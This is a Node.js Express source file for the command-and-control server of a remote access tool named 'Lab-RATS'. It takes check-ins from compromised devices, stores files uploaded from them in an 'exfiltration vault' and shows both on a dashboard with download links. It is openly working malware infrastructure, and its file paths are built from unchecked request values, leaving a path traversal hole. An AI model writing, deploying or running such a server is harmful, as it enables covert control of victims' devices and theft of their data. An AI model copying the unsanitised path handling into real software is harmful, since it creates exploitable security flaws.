const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

const upload = multer({ dest: 'uploads/' });
app.use(express.json());

const EXFIL_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(EXFIL_DIR)) fs.mkdirSync(EXFIL_DIR);

let devices = {};

// Helper: Scan exfil directory for files
function getExfiltratedFiles() {
    let results = [];
    if (!fs.existsSync(EXFIL_DIR)) return results;
    
    const deviceFolders = fs.readdirSync(EXFIL_DIR);
    deviceFolders.forEach(folder => {
        const folderPath = path.join(EXFIL_DIR, folder);
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath);
            files.forEach(file => {
                const stats = fs.statSync(path.join(folderPath, file));
                results.push({
                    deviceId: folder,
                    name: file,
                    size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                    time: stats.mtime
                });
            });
        }
    });
    return results.sort((a, b) => b.time - a.time); // Newest first
}

// [GET] Dashboard & Vault
app.get('/', (req, res) => {
    const fleetRows = Object.values(devices).map(d => `
        <tr style="border-bottom: 1px solid rgba(0, 242, 255, 0.1);">
            <td style="padding: 15px; color: #00f2ff; font-family: monospace; font-size: 0.85rem;">${d.deviceId}</td>
            <td style="padding: 15px; font-weight: bold;">${d.model}</td>
            <td style="padding: 15px; color: ${parseInt(d.battery) < 20 ? '#ff3131' : '#39ff14'}">${d.battery}</td>
            <td style="padding: 15px;"><a href="${d.link}" target="_blank" style="color: #00f2ff; text-decoration: none; border: 1px solid #00f2ff; padding: 6px 15px; border-radius: 4px; font-size: 0.7rem; background: rgba(0, 242, 255, 0.1);">CONNECT</a></td>
            <td style="padding: 15px; font-size: 0.75rem; color: #888;">${new Date(d.lastSeen).toLocaleTimeString()}</td>
        </tr>
    `).join('');

    const fileRows = getExfiltratedFiles().map(f => `
        <tr style="border-bottom: 1px solid rgba(255, 255, 255, 0.05);">
            <td style="padding: 12px; font-size: 0.8rem; color: #aaa;">${f.deviceId.substring(0, 8)}...</td>
            <td style="padding: 12px; color: #eee; font-family: monospace;">${f.name}</td>
            <td style="padding: 12px; font-size: 0.8rem; color: #666;">${f.size}</td>
            <td style="padding: 12px;"><a href="/download/${f.deviceId}/${f.name}" style="color: #39ff14; text-decoration: none; font-weight: bold; font-size: 0.75rem;">[ GET ]</a></td>
        </tr>
    `).join('');

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Lab-RATS | C2</title>
            <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
            <style>
                * { box-sizing: border-box; }
                body { 
                    background: #000; 
                    color: white; 
                    font-family: 'Orbitron', sans-serif; 
                    padding: 40px; 
                    max-width: 1200px; 
                    margin: auto; 
                    position: relative; 
                    min-height: 100vh;
                    overflow-x: hidden;
                }
                /* High-Visibility Watermark */
                body::before {
                    content: ""; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
                    width: 600px; height: 600px;
                    background: url('/logo.png') no-repeat center;
                    background-size: contain; 
                    opacity: 0.35; 
                    z-index: -1;
                    pointer-events: none;
                    filter: drop-shadow(0 0 30px rgba(0, 242, 255, 0.2));
                }
                h1, h2 { letter-spacing: 3px; text-transform: uppercase; }
                h1 { color: #00f2ff; border-bottom: 2px solid #00f2ff; padding-bottom: 15px; margin-bottom: 40px; }
                
                /* Transparent Tactical Containers */
                .card { 
                    background: rgba(10, 10, 15, 0.4); 
                    border: 1px solid rgba(0, 242, 255, 0.3); 
                    border-radius: 12px; 
                    overflow: hidden; 
                    margin-bottom: 40px; 
                    backdrop-filter: blur(15px); 
                    -webkit-backdrop-filter: blur(15px);
                    box-shadow: 0 10px 40px rgba(0,0,0,0.5);
                }
                
                table { width: 100%; border-collapse: collapse; }
                th { background: rgba(0, 242, 255, 0.15); color: #00f2ff; padding: 15px; text-align: left; font-size: 0.7rem; letter-spacing: 1px; }
                td { padding: 12px; }
                
                a { transition: all 0.3s; }
                a:hover { background: rgba(0, 242, 255, 0.2) !important; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); }
            </style>
        </head>
        <body>
            <h1>LAB-RATS_C2_INFRASTRUCTURE</h1>
            
            <h2 style="color: #00f2ff;">📡 ACTIVE_FLEET</h2>
            <div class="card">
                <table>
                    <thead>
                        <tr><th>DEVICE_ID</th><th>IDENTITY</th><th>BAT</th><th>UPLINK</th><th>LAST_SEEN</th></tr>
                    </thead>
                    <tbody>${fleetRows || '<tr><td colspan="5" style="padding: 40px; text-align: center; color: #555;">NO_UPLINKS_DETECTED</td></tr>'}</tbody>
                </table>
            </div>

            <h2 style="color: #39ff14;">📂 EXFILTRATION_VAULT</h2>
            <div class="card" style="border-color: rgba(57, 255, 20, 0.2);">
                <table>
                    <thead>
                        <tr><th>SOURCE</th><th>FILENAME</th><th>SIZE</th><th>ACTION</th></tr>
                    </thead>
                    <tbody>${fileRows || '<tr><td colspan="4" style="padding: 40px; text-align: center; color: #444;">VAULT_EMPTY</td></tr>'}</tbody>
                </table>
            </div>
        </body>
        </html>
    `);
});

// Serve the local logo.png
app.get('/logo.png', (req, res) => {
    const logoPath = path.join(__dirname, 'logo.png');
    if (fs.existsSync(logoPath)) {
        res.sendFile(logoPath);
    } else {
        res.status(404).send('MISSING');
    }
});

// Secure Download Route
app.get('/download/:deviceId/:filename', (req, res) => {
    const filePath = path.join(EXFIL_DIR, req.params.deviceId, req.params.filename);
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('NOT_FOUND');
    }
});

// Unified Check-in & Exfil Logic
app.post('/', upload.single('fileToUpload'), (req, res) => {
    const data = req.body;
    const deviceId = data.deviceId || req.headers['x-device-id'] || 'unknown';

    // 1. Status Check-in
    if (data.type === 'checkin') {
        devices[deviceId] = { ...data, lastSeen: Date.now() };
        console.log(`[+] Check-in: ${deviceId} (${data.model})`);
        return res.status(200).json({ status: 'ACK' });
    }

    // 2. File Upload
    if (req.file) {
        const devicePath = path.join(EXFIL_DIR, deviceId);
        if (!fs.existsSync(devicePath)) fs.mkdirSync(devicePath, { recursive: true });
        
        const finalPath = path.join(devicePath, req.file.originalname || `exfil_${Date.now()}`);
        fs.renameSync(req.file.path, finalPath);
        
        console.log(`[EXFIL] Capture successful from ${deviceId}: ${req.file.originalname}`);
        return res.status(201).send('CAPTURED');
    }

    res.status(400).send('INVALID');
});

app.listen(port, () => console.log(`Lab-RATS C2 Core Established on Port ${port}`));
